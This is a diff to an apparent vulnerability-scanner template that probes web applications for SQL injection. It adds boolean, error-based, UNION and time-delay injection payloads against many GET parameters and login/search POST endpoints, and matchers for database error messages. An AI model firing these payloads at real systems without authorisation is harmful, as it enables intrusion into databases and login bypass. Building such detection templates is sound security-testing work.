@@ -1,24 +1,154 @@
 id: sqli-probe
 info:
   name: SQL Injection Probe
-  severity: Medium
+  severity: High
+  description: |
+    通用SQL注入探测插件，通过注入SQL测试payload并检查响应中的数据库错误特征。
+    覆盖多种注入点和数据库类型。
+  tags:
+    - sqli
+    - injection
+    - database
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+
 requests:
   - method: GET
     preconditions:
       methods: [GET]
     path:
-      - "{{BaseURL}}/search?q={{payload}}"
+      - "{{BaseURL}}/?id={{payload}}"
+      - "{{BaseURL}}/?q={{payload}}"
+      - "{{BaseURL}}/?search={{payload}}"
+      - "{{BaseURL}}/?query={{payload}}"
+      - "{{BaseURL}}/?keyword={{payload}}"
+      - "{{BaseURL}}/?name={{payload}}"
+      - "{{BaseURL}}/?user={{payload}}"
+      - "{{BaseURL}}/?uid={{payload}}"
+      - "{{BaseURL}}/?pid={{payload}}"
+      - "{{BaseURL}}/?cat={{payload}}"
+      - "{{BaseURL}}/?category={{payload}}"
+      - "{{BaseURL}}/?item={{payload}}"
+      - "{{BaseURL}}/?page_id={{payload}}"
+      - "{{BaseURL}}/?article_id={{payload}}"
+      - "{{BaseURL}}/?news_id={{payload}}"
+      - "{{BaseURL}}/?row={{payload}}"
+      - "{{BaseURL}}/?sort={{payload}}"
+      - "{{BaseURL}}/?order={{payload}}"
     payload_sets:
       default:
         - "' OR '1'='1"
-      full:
-        - "' OR '1'='1"
         - "1' AND '1'='1"
+        - "' OR 1=1--"
+        - "1' OR '1'='1'--"
+        - "\" OR \"\"=\""
+        - "1; WAITFOR DELAY '0:0:3'--"
+        - "1' AND SLEEP(3)--"
+      error_based:
+        - "' AND 1=CONVERT(int,(SELECT @@version))--"
+        - "' AND 1=CAST((SELECT @@version) AS int)--"
+        - "' UNION SELECT NULL--"
+        - "' UNION SELECT NULL,NULL--"
+        - "' UNION SELECT NULL,NULL,NULL--"
+        - "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
+        - "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--"
+      time_based:
+        - "1' AND SLEEP(5)--"
+        - "1; WAITFOR DELAY '0:0:5'--"
+        - "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+    matchers-condition: or
     matchers:
       - type: word
         words:
-          - "sql"
-          - "syntax"
+          - "sql syntax"
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "mysql_num_rows"
+          - "MySQLSyntaxErrorException"
+          - "valid MySQL result"
+          - "check the manual that corresponds to your MySQL"
+          - "PostgreSQL query failed"
+          - "pg_query"
+          - "pg_exec"
+          - "Microsoft SQL Server"
+          - "ODBC SQL Server Driver"
+          - "SqlException"
+          - "Unclosed quotation mark"
+          - "sqlite_"
+          - "SQLite3::query"
+          - "SQLITE_ERROR"
+          - "sqlite3.OperationalError"
+          - "IntegrityError"
+          - "OperationalError"
+          - "ProgrammingError"
+          - "sqlalchemy.exc"
+          - "You have an error in your SQL syntax"
+          - "Warning: mysql_"
+          - "valid MySQL result"
+          - "MySqlClient"
+          - "ORA-01756"
+          - "ORA-00933"
+          - "oracle.jdbc"
+          - "System.Data.SqlClient"
+          - "SqlException"
+          - "Unclosed quotation mark after the character string"
+        condition: or
+        part: body
+      - type: regex
+        regex:
+          - "SQL syntax.*?MySQL"
+          - "Warning.*?\\Wmysqli?_"
+          - "valid MySQL result"
+          - "MySqlClient\\."
+          - "PostgreSQL.*?ERROR"
+          - "Warning.*?\\Wpg_"
+          - "valid PostgreSQL result"
+          - "Npgsql\\."
+          - "Driver.*? SQL[\\-\\_\\s]*Server"
+          - "OLE DB.*? SQL Server"
+          - "(?i)\\bORA-\\d{4,5}\\b"
+          - "Oracle error"
+          - "Oracle.*?Driver"
+          - "Warning.*?\\Woci_"
+          - "Warning.*?\\Wora_"
+          - "SQLite3::query"
+          - "sqlite3\\.OperationalError"
+          - "SQLSTATE\\[\\d+\\]"
+        part: body
+      - type: status
+        status: [500]
+
+  - method: POST
+    preconditions:
+      methods: [POST]
+    path:
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/query"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/submit"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "q={{payload}}&submit=Search"
+    payload_sets:
+      default:
+        - "' OR '1'='1"
+        - "1' AND '1'='1"
+        - "' OR 1=1--"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "sql syntax"
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "You have an error in your SQL syntax"
+          - "IntegrityError"
+          - "OperationalError"
+          - "SQLSTATE"
+          - "SQLITE_ERROR"
+        condition: or
         part: body
       - type: status
         status: [500]
